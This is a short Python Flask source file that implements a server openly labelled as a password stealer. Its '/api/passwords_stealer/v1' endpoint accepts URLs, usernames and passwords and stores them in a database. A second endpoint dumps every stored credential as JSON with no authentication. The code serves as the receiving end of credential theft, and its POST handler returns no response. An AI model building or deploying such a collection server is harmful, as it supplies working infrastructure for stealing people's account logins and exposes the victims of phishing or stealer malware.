import os
import flask
from flask import request, jsonify
from flask_sqlalchemy import SQLAlchemy

app = flask.Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = os.environ['DATABASE_URL']
db = SQLAlchemy(app)


class Entry(db.Model):
    __tablename__ = "Passwords"
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    url = db.Column(db.String(256), nullable=True)
    username = db.Column(db.String(256), nullable=True)
    password = db.Column(db.String(256), nullable=True)

    def __init__(self, url, username, password):
        self.url = url
        self.username = username
        self.password = password

    def toDict(self):
        return {"url": self.url, "username": self.username, "password": self.password}


@app.route("/", methods=["GET"])
def index():
    return '''<h1>A simple API for handling passwords</h1>
<p>Just not my passwords</p>'''


@app.route("/api/passwords_stealer/v1", methods=["GET", "POST"])
def receivePassword():
    if request.method == "POST":
        #get all the data from the requests
        url = request.form.get("url")
        username = request.form.get("username")
        password = request.form.get("password")

        #add the passwords to the database
        entry = Entry(url=url, username=username, password=password)
        db.session.add(entry)
        db.session.commit()
    else:
        return "HELLO!!!!"
@app.route("/api/passwords_stealer/v1/all", methods=["GET"])
def getAllPasswords():
    allEntry = Entry.query.all()
    jsonFormat = []
    for entry in allEntry:
        jsonFormat.append(entry.toDict())
    return jsonify(jsonFormat)


@app.errorhandler(404)
def page_not_found(e):
    return "<h1>404</h1><p>The resource could not be found.</p>", 404







